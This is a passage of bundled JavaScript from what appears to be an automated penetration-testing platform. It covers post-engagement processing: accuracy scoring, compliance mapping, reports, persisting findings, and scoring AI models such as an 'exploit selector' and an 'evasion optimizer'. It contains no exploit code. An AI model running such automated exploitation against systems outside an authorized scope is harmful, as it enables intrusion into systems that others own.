          let engNotes = null;
          try {
            const { engagements: engTable } = await import("./schema-RL5B6OMI.js");
            const { getDbRequired: getDbReq } = await import("./db-D773P4Y2.js");
            const { eq: eqOp } = await import("drizzle-orm");
            const dbForNotes = await getDbReq();
            const [engRow] = await dbForNotes.select({ notes: engTable.notes }).from(engTable).where(eqOp(engTable.id, engagementId)).limit(1);
            if (engRow?.notes) {
              engNotes = typeof engRow.notes === "string" ? JSON.parse(engRow.notes) : engRow.notes;
            }
          } catch {
          }
          if (!engNotes) {
            try {
              engNotes = typeof state.notes === "string" ? JSON.parse(state.notes) : state.notes;
            } catch {
            }
          }
          try {
            if (engNotes?.bountyKnowledgeInjected) {
              modulesUsed.push("bounty_training_knowledge");
              if (engNotes.bountyKnowledge?.topCwes?.length) {
                modulesUsed.push(`bounty_cwe_patterns_${engNotes.bountyKnowledge.topCwes.length}`);
              }
              if (engNotes.bountyKnowledge?.enrichedPatterns?.length) {
                modulesUsed.push(`bounty_enriched_categories_${engNotes.bountyKnowledge.enrichedPatterns.length}`);
              }
              if (engNotes.bountyKnowledge?.totalTrainingSamples) {
                modulesUsed.push(`bounty_training_samples_${engNotes.bountyKnowledge.totalTrainingSamples}`);
              }
            }
            if (engNotes?.dfirKnowledgeInjected) {
              modulesUsed.push("dfir_knowledge");
              modulesUsed.push(`dfir_reports_${engNotes.dfirReportsCount || 0}`);
            }
          } catch {
          }
          if (state.trainingLabMode) {
            modulesUsed.push("training_lab_mode");
          }
          if (state.dfirKnowledgeContext?.length > 0) {
            modulesUsed.push("dfir_context_injected");
          }
          const uniqueModules = [...new Set(modulesUsed)];
          const compResult = await runAccuracyComparison({
            sessionId: `eng-${engagementId}-${Date.now()}`,
            engagementId: String(engagementId),
            targetPreset,
            targetUrl: state.assets[0]?.hostname || "",
            scanType: state.engagementType,
            findings: allFindings,
            knowledgeModulesUsed: uniqueModules,
            scanDurationMs: state.completedAt ? state.completedAt - (state.startedAt || state.completedAt) : void 0
          });
          if (compResult) {
            const deltaStr = compResult.f1Delta != null ? ` (\u0394${compResult.f1Delta >= 0 ? "+" : ""}${(compResult.f1Delta * 100).toFixed(1)}%)` : "";
            const trendEmoji = compResult.f1Delta != null ? compResult.f1Delta > 0.02 ? "\u{1F4C8}" : compResult.f1Delta < -0.02 ? "\u{1F4C9}" : "\u27A1\uFE0F" : "";
            const bountyAttr = uniqueModules.includes("bounty_training_knowledge") ? " | \u{1F3AF} Bounty Knowledge Active" : "";
            addLog(state, {
              phase: "completed",
              type: "info",
              title: `\u2705 Accuracy (DO): F1=${(compResult.f1Score * 100).toFixed(1)}%${deltaStr} ${trendEmoji}`,
              detail: `P=${(compResult.precision * 100).toFixed(1)}% R=${(compResult.recall * 100).toFixed(1)}% | TP=${compResult.truePositives} FP=${compResult.falsePositives} FN=${compResult.falseNegatives} | Missed: ${compResult.missedVulns.slice(0, 5).join(", ") || "none"}${bountyAttr}`,
              data: { accuracyComparison: compResult, knowledgeModules: uniqueModules }
            });
            broadcastOpsUpdate(state.engagementId, { type: "log_update" });
            try {
              const { notifyOwner } = await import("./notification-4RFY3TAD.js");
              const f1Pct = (compResult.f1Score * 100).toFixed(1);
              const pPct = (compResult.precision * 100).toFixed(1);
              const rPct = (compResult.recall * 100).toFixed(1);
              const bountyNote = uniqueModules.includes("bounty_training_knowledge") ? `
Knowledge Modules: Bug Bounty Training (${engNotes?.bountyKnowledge?.totalTrainingSamples || 0} samples, ${engNotes?.bountyKnowledge?.topCwes?.length || 0} CWE patterns)` : "";
              await notifyOwner({
                title: `Accuracy Report: ${targetPreset} \u2014 F1 ${f1Pct}%${deltaStr}`,
                content: `Engagement #${engagementId} completed on ${targetPreset}.
F1: ${f1Pct}% | Precision: ${pPct}% | Recall: ${rPct}%
TP: ${compResult.truePositives} | FP: ${compResult.falsePositives} | FN: ${compResult.falseNegatives}
Missed: ${compResult.missedVulns.slice(0, 5).join(", ") || "none"}${bountyNote}
View details on the Knowledge Base \u2192 Accuracy Feedback tab.`
              });
            } catch (notifErr) {
              console.warn("[AccuracyFeedback] Notification failed:", notifErr.message);
            }
          }
          try {
            const { runLocalAccuracyComparison } = await import("./accuracy-feedback-loop-RLMP5WEP.js");
            const localFull = await runLocalAccuracyComparison({
              sessionId: `eng-${engagementId}-local-full-${Date.now()}`,
              engagementId: String(engagementId),
              targetPreset,
              targetUrl: state.assets[0]?.hostname || "",
              scanType: state.engagementType,
              findings: allFindings,
              knowledgeModulesUsed: uniqueModules,
              scanDurationMs: state.completedAt ? state.completedAt - (state.startedAt || state.completedAt) : void 0,
              autoDetectableOnly: false
            });
            const localAuto = await runLocalAccuracyComparison({
              sessionId: `eng-${engagementId}-local-auto-${Date.now()}`,
              engagementId: String(engagementId),
              targetPreset,
              targetUrl: state.assets[0]?.hostname || "",
              scanType: state.engagementType,
              findings: allFindings,
              knowledgeModulesUsed: uniqueModules,
              scanDurationMs: state.completedAt ? state.completedAt - (state.startedAt || state.completedAt) : void 0,
              autoDetectableOnly: true
            });
            if (localFull) {
              addLog(state, {
                phase: "completed",
                type: "info",
                title: `\u{1F4CA} Local Accuracy (Full): F1=${(localFull.f1Score * 100).toFixed(1)}%`,
                detail: `P=${(localFull.precision * 100).toFixed(1)}% R=${(localFull.recall * 100).toFixed(1)}% | TP=${localFull.truePositives} FP=${localFull.falsePositives} FN=${localFull.falseNegatives}`,
                data: { localAccuracyFull: localFull }
              });
            }
            if (localAuto) {
              addLog(state, {
                phase: "completed",
                type: "info",
                title: `\u{1F3AF} Local Accuracy (Auto-Detectable): F1=${(localAuto.f1Score * 100).toFixed(1)}%`,
                detail: `P=${(localAuto.precision * 100).toFixed(1)}% R=${(localAuto.recall * 100).toFixed(1)}% | TP=${localAuto.truePositives} FP=${localAuto.falsePositives} FN=${localAuto.falseNegatives} | Missed: ${localAuto.missedVulns.slice(0, 5).join(", ") || "none"}`,
                data: { localAccuracyAutoDetectable: localAuto }
              });
            }
            broadcastOpsUpdate(state.engagementId, { type: "log_update" });
          } catch (localErr) {
            console.warn("[AccuracyFeedback] Local scoring failed:", localErr.message);
          }
        }
      } catch (accErr) {
        console.warn("[AccuracyFeedback] Auto-comparison failed:", accErr.message);
      }
      try {
        const { mapEngagementToCompliance } = await import("./compliance-evidence-mapper-LIULFBKX.js");
        const mappingInput = {
          engagementId,
          assets: state.assets.map((a) => ({
            hostname: a.hostname,
            ip: a.ip,
            vulns: a.vulns.map((v) => ({
              title: v.title || v.name || "Unknown",
              severity: v.severity || "info",
              description: v.description,
              tool: v.tool || v.source || "unknown",
              cve: v.cve,
              rawOutput: v.rawOutput || v.evidence
            })),
            ports: a.ports.map((p) => ({
              port: p.port,
              service: p.service,
              protocol: p.protocol
            })),
            toolResults: (a.toolResults || []).map((tr) => ({
              tool: tr.tool,
              command: tr.command,
              exitCode: tr.exitCode,
              findingCount: tr.findingCount || 0,
              outputPreview: tr.output?.slice(0, 500),
              findings: (tr.findings || []).map((f) => ({
                title: f.title || f.name || "finding",
                severity: f.severity || "info"
              }))
            })),
            zapFindings: (a.zapFindings || []).map((z) => ({
              alert: z.alert || z.name || "ZAP finding",
              risk: z.risk || z.severity || "info",
              description: z.description,
              url: z.url,
              evidence: z.evidence
            }))
          }))
        };
        const complianceResult = mapEngagementToCompliance(mappingInput);
        if (!state.metadata) state.metadata = {};
        state.metadata.complianceMapping = {
          totalEvidence: complianceResult.totalEvidenceItems,
          frameworksCovered: complianceResult.frameworksCovered,
          gapCount: complianceResult.gapCount,
          summaries: complianceResult.summaries.map((s) => ({
            framework: s.framework,
            totalControls: s.totalControls,
            compliant: s.compliant,
            nonCompliant: s.nonCompliant,
            partial: s.partial,
            noEvidence: s.noEvidence,
            complianceScore: s.complianceScore
          })),
          generatedAt: Date.now()
        };
        const topFrameworks = complianceResult.summaries.sort((a, b) => b.complianceScore - a.complianceScore).slice(0, 3).map((s) => `${s.framework}: ${s.complianceScore}%`).join(", ");
        addLog(state, {
          phase: "completed",
          type: "info",
          title: `\u{1F4CB} Compliance Evidence: ${complianceResult.totalEvidenceItems} items across ${complianceResult.frameworksCovered.length} frameworks`,
          detail: `Scores: ${topFrameworks} | Gaps: ${complianceResult.gapCount} controls without evidence`,
          data: { complianceMapping: state.metadata.complianceMapping }
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      } catch (compErr) {
        console.warn("[ComplianceMapper] Auto-mapping failed:", compErr.message);
        addLog(state, {
          phase: "completed",
          type: "warning",
          title: "\u26A0\uFE0F Compliance Mapping Failed",
          detail: compErr.message
        });
      }
    }
    try {
      const { generateAutoReport } = await import("./engagement-auto-report-2HVCQFXO.js");
      const reportResult = await generateAutoReport(
        state,
        engagement,
        {
          addLog: (entry) => addLog(state, entry),
          broadcastUpdate: (update) => broadcastOpsUpdate(state.engagementId, update)
        }
      );
      if (reportResult.success && reportResult.reportId) {
        if (!state.metadata) state.metadata = {};
        state.metadata.autoReportId = reportResult.reportId;
        state.metadata.autoReportFindings = reportResult.findingsCount;
      }
    } catch (reportErr) {
      console.error("[AutoReport] Auto-report generation failed:", reportErr.message);
      addLog(state, {
        phase: "completed",
        type: "warning",
        title: "\u26A0\uFE0F Auto-Report Generation Failed",
        detail: `${reportErr.message}. You can manually create a report from the Reports tab.`
      });
    }
    try {
      addLog(state, {
        phase: "completed",
        type: "info",
        title: "\u{1F4CB} Test Plan Adherence: Analyzing execution against PTES/NIST standards...",
        detail: "Comparing planned tests vs actual execution, identifying coverage gaps, generating recommendations"
      });
      broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      const { generateTestPlanAdherence } = await import("./engagement-report-handoff-HO25NP7V.js");
      let testPlanForHandoff = null;
      const rawTestPlan = state.testPlan;
      if (rawTestPlan) {
        const targets = state.assets.map((a) => a.hostname || a.ip).filter(Boolean);
        const toolsPlanned = rawTestPlan.toolsPlanned || [];
        const ptesPhaseMap = {
          "executive": "Pre-engagement Interactions",
          "scope": "Pre-engagement Interactions",
          "methodology": "Intelligence Gathering",
          "intelligence": "Intelligence Gathering",
          "recon": "Intelligence Gathering",
          "threat": "Threat Modeling",
          "attack": "Exploitation",
          "vulnerability": "Vulnerability Analysis",
          "exploit": "Exploitation",
          "post": "Post-Exploitation",
          "report": "Reporting",
          "deliverable": "Reporting",
          "dns": "Intelligence Gathering",
          "tool": "Vulnerability Analysis",
          "risk": "Pre-engagement Interactions",
          "communication": "Pre-engagement Interactions",
          "timeline": "Pre-engagement Interactions"
        };
        const inferPtesPhase = (title) => {
          const lower = title.toLowerCase();
          for (const [keyword, phase] of Object.entries(ptesPhaseMap)) {
            if (lower.includes(keyword)) return phase;
          }
          return "Vulnerability Analysis";
        };
        const attackVectorNames = rawTestPlan.attackVectors || [];
        const attackVectors = attackVectorNames.map((name, i) => ({
          id: `av-${i}`,
          name,
          tools: toolsPlanned.slice(0, 5),
          // Best-effort: associate top tools with each vector
          targets,
          ptesPhase: inferPtesPhase(name),
          estimatedHours: 2,
          priority: "high"
        }));
        const toolMatrix = toolsPlanned.map((tool) => {
          const toolLower = tool.toLowerCase();
          let phase = "Vulnerability Analysis";
          let purpose = "Security scanning";
          if (/naabu|masscan|nerva|discovery|recon|subfinder|httpx|dig|dnsrecon/.test(toolLower)) {
            phase = "Intelligence Gathering";
            purpose = "Reconnaissance and discovery";
          } else if (/nuclei|zap|burp|nikto|testssl/.test(toolLower)) {
            phase = "Vulnerability Analysis";
            purpose = "Vulnerability scanning";
          } else if (/metasploit|sqlmap|commix|hydra|exploit/.test(toolLower)) {
            phase = "Exploitation";
            purpose = "Exploitation and validation";
          }
          return { tool, purpose, targets, phase };
        });
        testPlanForHandoff = {
          metadata: {
            planId: rawTestPlan.id || "unknown",
            generatedAt: new Date(rawTestPlan.generatedAt || Date.now()).toISOString(),
            orgName: engagement.name || "Unknown",
            targetDomain: engagement.targetDomain || "",
            planType: "pentest"
          },
          sections: (rawTestPlan.sections || []).map((s) => ({
            id: s.id || s.title?.replace(/\s+/g, "-").toLowerCase() || "section",
            title: s.title || "Untitled",
            ptesPhase: inferPtesPhase(s.title || ""),
            nistSection: "\xA73",
            content: s.content || ""
          })),
          structuredData: {
            attackVectors,
            toolMatrix
          }
        };
      }
      const adherence = await generateTestPlanAdherence(
        {
          engagementId: state.engagementId,
          engagementName: engagement.name,
          engagementType: state.engagementType,
          phase: state.phase,
          assets: state.assets,
          stats: state.stats,
          log: state.log,
          startedAt: state.startedAt,
          completedAt: state.completedAt,
          metadata: state.metadata
        },
        testPlanForHandoff
      );
      if (!state.metadata) state.metadata = {};
      state.metadata.testPlanAdherence = {
        adherencePercentage: adherence.adherencePercentage,
        totalPlanned: adherence.totalPlannedTests,
        executed: adherence.executedTests,
        skipped: adherence.skippedTests,
        blocked: adherence.blockedTests,
        ptesPhases: adherence.ptesPhaseCompletion.map((p) => ({
          phase: p.phase,
          status: p.status,
          findings: p.findings
        })),
        coverageGaps: adherence.coverageGaps.length,
        recommendations: adherence.recommendations,
        generatedAt: adherence.generatedAt
      };
      const completedPhases = adherence.ptesPhaseCompletion.filter((p) => p.status === "completed").length;
      const totalPhases = adherence.ptesPhaseCompletion.length;
      addLog(state, {
        phase: "completed",
        type: "phase_complete",
        title: `\u{1F4CB} Test Plan Adherence: ${adherence.adherencePercentage}% \u2014 ${completedPhases}/${totalPhases} PTES phases completed`,
        detail: `Executed: ${adherence.executedTests} | Skipped: ${adherence.skippedTests} | Gaps: ${adherence.coverageGaps.length} | Recommendations: ${adherence.recommendations.length}`,
        data: { testPlanAdherence: state.metadata.testPlanAdherence }
      });
      broadcastOpsUpdate(state.engagementId, { type: "log_update" });
    } catch (adherenceErr) {
      console.warn("[TestPlanAdherence] Analysis failed:", adherenceErr.message);
      addLog(state, {
        phase: "completed",
        type: "warning",
        title: "\u26A0\uFE0F Test Plan Adherence Analysis Failed",
        detail: adherenceErr.message
      });
    }
    await phaseCheckpoint("completed");
    try {
      const { updateEngagement } = await import("./db-D773P4Y2.js");
      await updateEngagement(engagementId, {
        status: "completed",
        endDate: new Date(state.completedAt || Date.now()).toISOString().replace("T", " ").replace("Z", ""),
        autoResumeOnRestart: 0
      });
      console.log(`[Engagement] Marked #${engagementId} as completed in DB`);
    } catch (statusErr) {
      console.error(`[Engagement] Failed to mark #${engagementId} as completed:`, statusErr.message);
    }
    try {
      const { saveEngagementResult, saveEngagementFindings } = await import("./db-D773P4Y2.js");
      const sevBreakdown = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
      for (const asset of state.assets) {
        for (const v of asset.vulns || []) {
          const sev = (v.severity || "medium").toLowerCase();
          if (sev === "critical") sevBreakdown.critical++;
          else if (sev === "high") sevBreakdown.high++;
          else if (sev === "medium" || sev === "moderate") sevBreakdown.medium++;
          else if (sev === "low") sevBreakdown.low++;
          else sevBreakdown.info++;
        }
      }
      const owaspData = state.owaspCoverage || state.metadata?.owaspCoverage;
      const owaspCov = owaspData ? {
        score: owaspData.coveragePercentage || owaspData.score || 0,
        totalTested: owaspData.tested || owaspData.totalTested || 0,
        totalPartial: owaspData.partial || owaspData.totalPartial || 0,
        totalGaps: owaspData.gaps || owaspData.totalGaps || 0,
        criticalGaps: owaspData.criticalGaps || []
      } : void 0;
      const adherence = state.metadata?.testPlanAdherence;
      const summaryJson = {
        phases: state.log.filter((l) => l.type === "phase_complete").map((l) => l.phase),
        logEntryCount: state.log.length,
        testPlanAdherence: adherence || null,
        autoReportId: state.metadata?.autoReportId || null,
        autoReportFindings: state.metadata?.autoReportFindings || 0,
        scanProfile: state.scanProfile || "standard",
        safetyLevel: state.safetyLevel || "standard"
      };
      const resultId = await saveEngagementResult({
        engagementId,
        operatorId: parseInt(String(operatorCtx.id), 10) || void 0,
        operatorName: operatorCtx.name,
        engagementType: state.engagementType,
        targetDomain: state.assets.map((a) => a.hostname).join(", "),
        status: "completed",
        startedAt: state.startedAt,
        completedAt: state.completedAt,
        durationMs: (state.completedAt || Date.now()) - (state.startedAt || Date.now()),
        stats: {
          hostsScanned: state.assets.length,
          portsFound: state.stats.portsFound,
          vulnsFound: state.stats.vulnsFound,
          verifiedVulns: state.stats.verifiedVulns || 0,
          unverifiedVulns: state.stats.unverifiedVulns || 0,
          exploitsAttempted: state.stats.exploitsAttempted,
          exploitsSucceeded: state.stats.exploitsSucceeded,
          sessionsOpened: state.stats.sessionsOpened,
          zapScansRun: state.stats.zapScansRun || 0
        },
        severityBreakdown: sevBreakdown,
        owaspCoverage: owaspCov,
        autoReportId: state.metadata?.autoReportId,
        summaryJson
      });
      const findingsToSave = [];
      for (const asset of state.assets) {
        for (const v of asset.vulns || []) {
          const sev = (v.severity || "medium").toLowerCase();
          const mappedSev = sev === "moderate" ? "medium" : ["critical", "high", "medium", "low", "info"].includes(sev) ? sev : "medium";
          findingsToSave.push({
            engagementId,
            resultId,
            title: v.title || v.cve || "Untitled",
            severity: mappedSev,
            cve: v.cve || void 0,
            cwe: v.cwe || void 0,
            description: v.description || void 0,
            endpoint: v.endpoint || v.url || void 0,
            hostname: asset.hostname,
            port: v.port || void 0,
            source: v.source || void 0,
            tool: v.tool || v.source || void 0,
            corroborationTier: v.corroborationTier || v.verified ? "confirmed" : "unverified",
            rawEvidence: v.rawEvidence || v.evidence || void 0,
            exploitAttempted: (asset.exploitAttempts || []).some((e) => e.vulnTitle === v.title),
            exploitSucceeded: (asset.exploitAttempts || []).some((e) => e.vulnTitle === v.title && e.succeeded),
            exploitTechnique: (asset.exploitAttempts || []).find((e) => e.vulnTitle === v.title)?.technique,
            owaspCategory: v.owaspCategory || void 0,
            mitreTechnique: v.mitreTechnique || void 0
          });
        }
        for (const zf of asset.zapFindings || []) {
          const zapSev = (zf.risk || "medium").toLowerCase();
          const mappedZapSev = ["critical", "high", "medium", "low", "info"].includes(zapSev) ? zapSev : "medium";
          findingsToSave.push({
            engagementId,
            resultId,
            title: zf.alert || "ZAP Finding",
            severity: mappedZapSev,
            description: zf.description || void 0,
            endpoint: zf.url || void 0,
            hostname: asset.hostname,
            source: "zap",
            tool: "zap",
            corroborationTier: "unverified",
            rawEvidence: zf.other || zf.solution || void 0
          });
        }
      }
      const savedCount = await saveEngagementFindings(findingsToSave);
      addLog(state, {
        phase: "completed",
        type: "info",
        title: `\u{1F4BE} Results Persisted: ${savedCount} findings saved to DB`,
        detail: `Result ID: ${resultId} | Findings: ${savedCount} (${sevBreakdown.critical}C/${sevBreakdown.high}H/${sevBreakdown.medium}M/${sevBreakdown.low}L/${sevBreakdown.info}I)${owaspCov ? ` | OWASP: ${owaspCov.score}%` : ""}`
      });
      broadcastOpsUpdate(state.engagementId, { type: "log_update" });
    } catch (persistErr) {
      console.error("[ResultPersistence] Failed to save engagement results:", persistErr.message);
      addLog(state, {
        phase: "completed",
        type: "warning",
        title: "\u26A0\uFE0F Result Persistence Failed",
        detail: `${persistErr.message}. Results are still available in the ops state snapshot.`
      });
    }
    try {
      const { getEngagementLlmTelemetryRaw } = await import("./db-D773P4Y2.js");
      const { analyzeHotPaths } = await import("./llm-hot-path-analyzer-45G5ZXV2.js");
      const rawTelemetry = await getEngagementLlmTelemetryRaw(engagementId);
      if (rawTelemetry.length >= 10) {
        const hotPathAnalysis = analyzeHotPaths(rawTelemetry, { engagementId, topN: 10, minCallsForAnalysis: 3 });
        state.metadata.hotPathAnalysis = {
          analyzedAt: hotPathAnalysis.analyzedAt,
          summary: hotPathAnalysis.summary,
          top5: hotPathAnalysis.hotPaths.slice(0, 5).map((hp) => ({
            caller: hp.caller,
            calls: hp.totalCalls,
            pctOfTotal: hp.percentOfTotal.toFixed(1),
            cost: hp.estimatedCost.toFixed(4),
            graduation: hp.graduationRecommendation,
            graduationScore: hp.graduationScore.toFixed(2)
          })),
          redundancyClusters: hotPathAnalysis.redundancyClusters.length,
          recommendations: hotPathAnalysis.recommendations.slice(0, 5).map((r) => ({
            priority: r.priority,
            category: r.category,
            caller: r.caller,
            title: r.title,
            callsReduced: r.estimatedImpact.callsReduced,
            costReduced: r.estimatedImpact.costReduced.toFixed(4)
          })),
          projectedSavings: hotPathAnalysis.projectedSavings
        };
        const top5Lines = hotPathAnalysis.hotPaths.slice(0, 5).map(
          (hp, i) => `${i + 1}. ${hp.caller}: ${hp.totalCalls} calls (${hp.percentOfTotal.toFixed(1)}%), $${hp.estimatedCost.toFixed(4)}, grad=${hp.graduationRecommendation}`
        );
        addLog(state, {
          phase: "completed",
          type: "info",
          title: `\u{1F525} Hot Path Analysis: ${hotPathAnalysis.summary.totalCalls} calls, $${hotPathAnalysis.summary.totalCost.toFixed(4)} total cost`,
          detail: [
            `Top 5 costliest call sites (${hotPathAnalysis.summary.top5CallerPercent.toFixed(1)}% of all calls):`,
            ...top5Lines,
            "",
            `Redundancy clusters: ${hotPathAnalysis.redundancyClusters.length}`,
            `Optimization recommendations: ${hotPathAnalysis.recommendations.length}`,
            `Projected savings: ${hotPathAnalysis.projectedSavings.callReductionPercent.toFixed(1)}% calls, ${hotPathAnalysis.projectedSavings.costReductionPercent.toFixed(1)}% cost`
          ].join("\n"),
          data: { hotPathAnalysis: state.metadata.hotPathAnalysis }
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
        console.log(`[HotPath] Engagement #${engagementId}: ${hotPathAnalysis.summary.totalCalls} calls analyzed, ${hotPathAnalysis.recommendations.length} optimization recommendations`);
      } else {
        console.log(`[HotPath] Engagement #${engagementId}: Only ${rawTelemetry.length} telemetry records \u2014 skipping analysis (need >= 10)`);
      }
    } catch (hotPathErr) {
      console.warn(`[HotPath] Failed to analyze hot paths for #${engagementId}:`, hotPathErr.message);
    }
    try {
      const { feedbackLoop } = await import("./negative-example-feedback-loop-ABYTJH5L.js");
      const { confidenceCalibrationEngine } = await import("./bounty-confidence-calibration-ZFMAEXNR.js");
      const { crossTrainingBus } = await import("./cross-training-event-bus-GAB4HMRL.js");
      const rejectedFindings = [];
      for (const asset of state.assets) {
        for (const vuln of asset.vulns || []) {
          if (vuln.verified === false || vuln.corroborationTier === "false_positive" || vuln.status === "rejected") {
            rejectedFindings.push({
              id: `neg-${engagementId}-${vuln.cve || vuln.title || Math.random().toString(36).slice(2)}`,
              vulnClass: vuln.cwe || vuln.vulnClass || "unknown",
              title: vuln.title || vuln.cve || "Untitled",
              affectedEndpoint: vuln.endpoint || vuln.url || asset.hostname,
              technology: asset.passiveRecon?.technologies?.[0],
              severity: vuln.severity || "medium",
              rejectionReason: vuln.corroborationTier === "false_positive" ? "false_positive" : "not_reproducible",
              rejectionDetail: vuln.description || "Unverified finding from automated scan",
              programHandle: state.bbRoeConfig?.programHandle,
              submittedAt: new Date(state.startedAt || Date.now()).toISOString(),
              rejectedAt: (/* @__PURE__ */ new Date()).toISOString(),
              lessonsLearned: [`Unverified ${vuln.cwe || "finding"} on ${asset.hostname} \u2014 needs manual validation`],
              tags: [state.engagementType, vuln.source || "unknown"]
            });
          }
        }
      }
      if (rejectedFindings.length > 0) {
        const batchResult = feedbackLoop.processBatch(rejectedFindings, confidenceCalibrationEngine, crossTrainingBus);
        addLog(state, {
          phase: "completed",
          type: "info",
          title: `\u{1F504} Negative Example Feedback: ${batchResult.processed} rejections processed`,
          detail: [
            `Calibration updates: ${batchResult.calibrationUpdates}`,
            `Event bus publications: ${batchResult.eventsPublished}`,
            batchResult.driftDetected ? `\u26A0\uFE0F Calibration drift detected: ${batchResult.driftReport?.direction} (${batchResult.driftReport?.severity})` : "No calibration drift detected"
          ].join("\n")
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
        console.log(`[NegFeedback] Engagement #${engagementId}: ${batchResult.processed} rejections fed into calibration loop`);
      }
    } catch (negErr) {
      console.warn(`[NegFeedback] Failed for #${engagementId}:`, negErr.message);
    }
    const clearedMods = clearKnowledgeCache();
    if (clearedMods > 0) console.log(`[MemCleanup] Cleared ${clearedMods} knowledge module caches after completion`);
    emitSystemNotification({
      title: "Engagement Complete",
      message: `${state.engagementType} engagement #${engagementId} finished: ${state.stats.exploitsSucceeded} successful exploits`,
      severity: "info"
    });
    try {
      const { notifyOwner } = await import("./notification-4RFY3TAD.js");
      const durationMs = (state.completedAt || Date.now()) - (state.startedAt || Date.now());
      const durationMin = Math.round(durationMs / 6e4);
      const phases = ["recon", "enumeration", "vuln_detection", "social_engineering", "exploitation", "post_exploit"];
      const phasesCompleted = phases.filter((p) => state.log.some((l) => l.phase === p)).length;
      const critVulns = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "critical").length, 0);
      const highVulns = state.assets.reduce((sum, a) => sum + a.vulns.filter((v) => v.severity === "high").length, 0);
      await notifyOwner({
        title: `\u2705 Engagement #${engagementId} Complete \u2014 ${state.stats.vulnsFound} vulns, ${state.stats.exploitsSucceeded}/${state.stats.exploitsAttempted} exploits`,
        content: [
          `${state.engagementType.toUpperCase()} engagement #${engagementId} has completed.`,
          ``,
          `Duration: ${durationMin} minutes | Phases: ${phasesCompleted}/5`,
          `Assets: ${state.assets.length} | Ports: ${state.stats.portsFound}`,
          `Vulnerabilities: ${state.stats.vulnsFound} (${critVulns} critical, ${highVulns} high)`,
          `Exploits: ${state.stats.exploitsSucceeded}/${state.stats.exploitsAttempted} succeeded`,
          `Sessions: ${state.stats.sessionsOpened} | ZAP Scans: ${state.stats.zapScansRun || 0}`,
          `Log entries: ${state.log.length}`,
          ``,
          `View full results on the Engagement Ops page.`
        ].join("\n")
      });
    } catch (notifErr) {
      console.warn(`[Notification] Completion notification failed for #${engagementId}:`, notifErr.message);
    }
    try {
      const { runPostPipelineGraduation, extractEngagementMetrics } = await import("./post-pipeline-graduation-DXZWFASH.js");
      const engMetrics = extractEngagementMetrics(engagementId, state);
      const graduation = await runPostPipelineGraduation(engMetrics);
      addLog(state, {
        phase: "completed",
        type: "info",
        title: `\u{1F393} Graduation: ${graduation.modelsScored} specialist models scored`,
        detail: `Recon: ${graduation.scores.recon_analyst}/100 | Exploit: ${graduation.scores.exploit_selector}/100 | Evasion: ${graduation.scores.evasion_optimizer}/100 | Cognitive: ${graduation.scores.cognitive_core}/100 | Cloud: ${graduation.scores.cloud_assessor}/100 | SupplyChain: ${graduation.scores.supply_chain_analyst}/100 | Training examples: ${graduation.trainingExamplesCollected}`
      });
      broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      console.log(`[Graduation] \u{1F393} Engagement #${engagementId}: ${graduation.summary}`);
    } catch (gradErr) {
      console.warn(`[Graduation] Failed to record engagement outcomes for #${engagementId}:`, gradErr.message);
    }
    try {
      const { detectGaps, createGapsBatch } = await import("./intelligence-gaps-GVY3KLWG.js");
      const toolsUsedSet = /* @__PURE__ */ new Set();
      for (const asset of state.assets) {
        for (const tr of asset.toolResults || []) {
          toolsUsedSet.add(tr.tool);
        }
      }
      const errorLogs = state.log.filter((l) => l.type === "error" || l.type === "warning");
      const errorsEncountered = errorLogs.filter((l) => l.title.match(/failed|error|timeout/i)).slice(0, 50).map((l) => ({
        tool: l.title.match(/^(\w+)/)?.[1] || "unknown",
        error: l.detail || l.title,
        asset: void 0
      }));
      const authFailures = errorLogs.filter((l) => l.title.match(/auth|credential|login|access denied/i)).slice(0, 20).map((l) => ({
        asset: l.detail?.match(/([\w.-]+\.\w{2,})/)?.[1] || "unknown",
        service: l.title.match(/^(\w+)/)?.[1] || "unknown",
        reason: l.detail || l.title
      }));
      let outOfScope = [];
      try {
        const roeScope = engagement.roeScope;
        if (roeScope && typeof roeScope === "object") {
          outOfScope = roeScope.outOfScope || roeScope.excludedTargets || [];
        }
        if (state.bbRoeConfig?.testingRestrictions?.excludedTargets) {
          outOfScope = [...outOfScope, ...state.bbRoeConfig.testingRestrictions.excludedTargets];
        }
      } catch {
      }
      const gapCtx = {
        engagementId,
        customerId: engagement.customerName || `eng-${engagementId}`,
        scopeDomains: (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean),
        scopeAssets: state.assets.map((a) => a.hostname || a.ip || "").filter(Boolean),
        outOfScope,
        toolsUsed: [...toolsUsedSet],
        scanDurationMs: state.completedAt ? state.completedAt - (state.startedAt || state.completedAt) : void 0,
        maxDurationMs: void 0,
        // No hard limit tracked in state currently
        findingsCount: state.stats.vulnsFound || 0,
        assetsScanned: state.assets.filter((a) => a.status !== "discovered").map((a) => a.hostname || a.ip || "").filter(Boolean),
        assetsDiscovered: state.assets.map((a) => a.hostname || a.ip || "").filter(Boolean),
        portsScanned: state.assets.flatMap((a) => a.ports.map((p) => p.port)),
        servicesDetected: [...new Set(state.assets.flatMap((a) => a.ports.map((p) => p.service).filter(Boolean)))],
        errorsEncountered,
        authFailures
      };
      const detectedGaps = detectGaps(gapCtx);
      if (detectedGaps.length > 0) {
        const gapIds = await createGapsBatch(detectedGaps);
        addLog(state, {
          phase: "completed",
          type: "info",
          title: `\u{1F50D} Intelligence Gaps: ${detectedGaps.length} gaps auto-detected`,
          detail: [
            ...detectedGaps.slice(0, 5).map((g) => `\u2022 [${g.category}] ${g.title}`),
            detectedGaps.length > 5 ? `... and ${detectedGaps.length - 5} more` : ""
          ].filter(Boolean).join("\n"),
          data: { gapCount: detectedGaps.length, gapIds }
        });
        broadcastOpsUpdate(state.engagementId, { type: "log_update" });
      } else {
        addLog(state, {
          phase: "completed",
          type: "info",
          title: "\u{1F50D} Intelligence Gaps: No gaps detected",
          detail: "All scope areas appear to have been assessed. Manual review recommended."
        });
      }
      console.log(`[IntelGaps] Engagement #${engagementId}: ${detectedGaps.length} gaps auto-detected and persisted`);
    } catch (gapErr) {
      console.warn(`[IntelGaps] Failed to detect/persist gaps for #${engagementId}:`, gapErr.message);
    }
    try {
      const { updateProfileFromEngagement } = await import("./customer-intel-profile-RK7PEKTF.js");
